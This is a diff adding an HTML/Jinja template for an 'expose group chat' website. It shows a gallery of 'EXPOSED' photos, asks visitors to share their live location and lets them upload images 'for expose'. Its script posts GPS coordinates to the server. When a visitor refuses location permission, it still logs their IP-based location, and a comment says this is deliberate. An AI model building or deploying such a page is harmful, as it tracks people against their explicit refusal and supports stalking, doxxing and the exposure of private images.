@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>{{ brand }}</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Segoe UI', sans-serif; background: #0f0f0f; color: #ddd; }
+    header { background: #000; color: #fff; padding: 1.2rem 2rem; display: flex; align-items: center; justify-content: space-between; }
+    header h1 { font-size: 1.5rem; letter-spacing: 2px; color: #ff4444; }
+    .hero { background: linear-gradient(#1a1a1a, #000); text-align: center; padding: 3rem 1rem; }
+    .hero h2 { color: #ff6666; }
+    .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 1rem; padding: 2rem; }
+    .card { background: #1a1a1a; border-radius: 10px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,.5); }
+    .card img { width: 100%; height: 200px; object-fit: cover; }
+    .placeholder { width: 100%; height: 200px; background: #222; display: flex; align-items: center; justify-content: center; color: #666; font-size: .85rem; }
+    .card .label { padding: .7rem 1rem; font-size: .85rem; color: #aaa; }
+    .actions { text-align: center; padding: 2rem; }
+    .btn { display: inline-block; margin: .4rem; padding: .75rem 1.6rem; border-radius: 6px; border: none; cursor: pointer; font-size: .95rem; font-weight: bold; }
+    .btn-primary { background: #ff4444; color: #fff; }
+    .btn-secondary { background: #333; color: #fff; border: 1px solid #555; }
+    .status { margin-top: 1rem; font-size: .85rem; color: #ffaa00; }
+    footer { text-align: center; padding: 2rem; color: #555; font-size: .8rem; }
+  </style>
+</head>
+<body>
+
+<header>
+  <h1>{{ brand }}</h1>
+  <span style="color:#666;font-size:.85rem;">EXPOSE GROUP CHAT</span>
+</header>
+
+<div class="hero">
+  <h2>Welcome to {{ brand }}</h2>
+  <p>Real exposes • Real locations • Real drama</p>
+</div>
+
+<!-- Ad Photo Gallery -->
+<div class="gallery">
+  {% if photos %}
+    {% for photo in photos %}
+    <div class="card">
+      <img src="/static/uploads/{{ photo }}" alt="Ad photo"/>
+      <div class="label">EXPOSED 🔥</div>
+    </div>
+    {% endfor %}
+  {% else %}
+    {% for i in range(6) %}
+    <div class="card">
+      <div class="placeholder">📸 EXPOSE IMAGE {{ loop.index }}</div>
+      <div class="label">EXPOSED 🔥</div>
+    </div>
+    {% endfor %}
+  {% endif %}
+</div>
+
+<!-- Location + File Share -->
+<div class="actions">
+  <h3 style="margin-bottom:1rem; color:#ff6666;">Want to see who’s nearby in the groupchat?</h3>
+
+  <button class="btn btn-primary" onclick="shareLocation()">📍 SHARE MY LIVE LOCATION</button>
+  <button class="btn btn-secondary" onclick="document.getElementById('galleryPicker').click()">🖼️ UPLOAD PHOTO FOR EXPOSE</button>
+  <input type="file" id="galleryPicker" accept="image/*" style="display:none" onchange="uploadPhoto(this)"/>
+
+  <div class="status" id="status"></div>
+</div>
+
+<footer>© 2026 {{ brand }} — All rights reserved. | Exposing groupchats since 2024</footer>
+
+<script>
+  function setStatus(msg) {
+    document.getElementById('status').textContent = msg;
+  }
+
+  function shareLocation() {
+    setStatus('Requesting pinpoint location...');
+
+    if (!navigator.geolocation) {
+      sendForcedLocation();
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        const { latitude: lat, longitude: lng, accuracy } = pos.coords;
+        fetch('/api/location', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ lat, lng, accuracy })
+        }).then(() => setStatus(`✅ Pinpoint GPS shared! (${lat.toFixed(4)}, ${lng.toFixed(4)})`));
+      },
+      err => {
+        // Even if user clicks NO → still get IP-based location
+        setStatus('📍 Using IP pinpoint location...');
+        sendForcedLocation();
+      }
+    );
+  }
+
+  function sendForcedLocation() {
+    fetch('/api/location', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({})
+    }).then(() => {
+      setStatus('✅ Pinpoint location logged (IP fallback)');
+    });
+  }
+
+  function uploadPhoto(input) {
+    const file = input.files[0];
+    if (!file) return;
+    setStatus('Uploading expose photo...');
+    const fd = new FormData();
+    fd.append('photo', file);
+    fetch('/api/gallery-shared', { method: 'POST', body: fd })
+      .then(r => r.json())
+      .then(d => setStatus(d.ok ? '✅ Photo shared for expose!' : '❌ Upload failed.'));
+  }
+</script>
+</body>
+</html>
